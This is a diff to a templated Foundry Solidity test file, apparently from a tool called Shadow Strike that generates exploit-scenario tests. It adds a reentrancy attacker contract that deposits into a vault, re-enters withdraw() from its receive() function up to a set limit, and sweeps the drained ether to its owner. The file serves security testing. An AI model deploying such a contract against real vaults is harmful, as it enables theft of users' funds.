@@ -10,6 +10,48 @@ import "forge-std/Test.sol";
 {{ imp }}
 {% endfor %}
 
+{% for line in interface_lines %}
+{{ line }}
+{% endfor %}
+{% if bounded_receiver %}
+// Configurable counterpart of the bundled demo receiver (whose limit is constant).
+interface IShadowStrikeReentryVault {
+    function deposit() external payable;
+    function withdraw() external;
+}
+
+contract {{ receiver_type }} {
+    IShadowStrikeReentryVault public immutable target;
+    address public immutable owner;
+    uint256 public immutable MAX_REENTRIES;
+    uint256 public reentryCount;
+
+    constructor(address vault, uint256 maxReentries) {
+        target = IShadowStrikeReentryVault(vault);
+        owner = msg.sender;
+        MAX_REENTRIES = maxReentries;
+    }
+
+    function attack() external payable {
+        require(msg.sender == owner || msg.sender == address(this), "not owner");
+        if (msg.value > 0) target.deposit{value: msg.value}();
+        target.withdraw();
+    }
+
+    receive() external payable {
+        if (reentryCount < MAX_REENTRIES && address(target).balance >= msg.value) {
+            reentryCount += 1;
+            target.withdraw();
+        }
+    }
+
+    function sweep() external {
+        require(msg.sender == owner, "not owner");
+        payable(owner).transfer(address(this).balance);
+    }
+}
+{% endif %}
+
 contract ShadowStrike_{{ scenario_id }} is Test {
 {% for decl in contract_decls %}
     {{ decl }}
@@ -49,7 +91,7 @@ contract ShadowStrike_{{ scenario_id }} is Test {
         {{ line }}
 {% endfor %}
 
-        // ---- emitted for Shadow Strike trace/state-diff capture --------
+        // ---- balance/getter observations and written storage slots -----
 {% for line in emit_lines %}
         {{ line }}
 {% endfor %}
